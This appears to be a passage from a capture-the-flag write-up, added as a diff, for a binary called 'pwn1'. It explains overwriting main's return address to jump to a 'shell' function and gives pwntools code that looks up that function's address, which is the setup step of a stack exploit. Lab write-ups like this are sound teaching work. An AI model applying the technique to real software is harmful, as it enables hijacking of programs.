@@ -1,0 +1,13 @@
+STEP 2: set - up
+
+we need to overwrite the returning address of the 'main'
+function with the address of 'shell'.
+we need to first obtain the target address
+
+
+  from pwn import *
+
+  elf = ELF('./pwn1')
+
+  target_address = elf.symbols['shell']
+  print 'target address:\t', hex(target_address)
